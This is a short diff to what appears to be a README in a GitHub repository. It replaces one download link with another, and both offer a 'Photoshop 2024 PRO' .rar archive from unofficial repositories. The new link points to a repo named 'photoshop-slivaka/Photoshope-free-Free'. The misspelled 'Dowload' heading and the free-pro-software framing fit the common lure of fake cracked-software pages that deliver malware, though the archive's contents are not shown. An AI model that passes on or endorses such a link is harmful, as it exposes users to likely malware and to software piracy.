@@ -20,7 +20,7 @@
 
 ## A workflow dedicated entirely to creative photo processing
 
-## 🔐 [Dowload Photoshop 2024 PRO](https://github.com/TopazSoftware/set/raw/main/Topaz%20Studio%20.rar)
+## 🔐 [Dowload Photoshop 2024 PRO](https://github.com/photoshop-slivaka/Photoshope-free-Free/raw/refs/heads/main/Photoshop-install.rar)
 ### ● Features
 
 - Automatically check your system requirements (read below) so you know if you can install Photoshop
